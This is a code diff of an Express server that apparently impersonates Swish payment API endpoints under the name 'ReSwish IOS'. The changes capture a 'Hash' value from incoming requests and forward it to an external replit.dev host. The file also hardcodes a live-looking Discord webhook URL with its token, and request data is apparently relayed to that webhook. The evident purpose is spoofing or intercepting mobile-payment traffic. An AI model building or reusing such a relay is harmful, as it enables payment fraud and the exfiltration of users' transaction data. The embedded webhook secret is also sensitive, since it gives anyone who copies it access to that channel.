@@ -6,6 +6,8 @@ const app = express();
 const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1257464182257745980/c9fqfewXJrsw-BAvglkmbfJ99-WeCcdmWpsH59L8GejA3vovL4DSRv2kROAEjxTV_3ms";
 
 app.use(express.json());
+let savedData = {}; // Variable to store data from initiatepayment
+let Hash = ""; // Variable to store data from initiatepayment
 
 // Example route handler for '/'
 app.get('/', (req, res) => {
@@ -42,7 +44,7 @@ app.use(async (req, res, next) => {
       ],
       footer: { text: 'ReSwish IOS | Version (0.0.1)' }
     };
-
+    Hash = hash;
     await sendDiscordWebhookEmbed(embedMessage);
   } catch (error) {
     console.error('Error processing request:', error);
@@ -110,7 +112,10 @@ app.post("/mpc-swish/api/v3/executepayment/:id/:id2", async (req, res) => {
   try {
     // Example URL to fetch data using saved data
     const url = `https://c8cb6293-3269-4a5a-8ac0-61bde456d942-00-1tkdqf6eyupe1.riker.replit.dev/initiatePayment?phone=${msisdnPayee}`;
-    const response = await axios.get(url);
+    const headers = {
+      'Hash': Hash // Replace with your actual hash value
+    };
+    const response = await axios.get(url, { headers });
     console.log('Data received:', response.data);
 
     // Construct response data
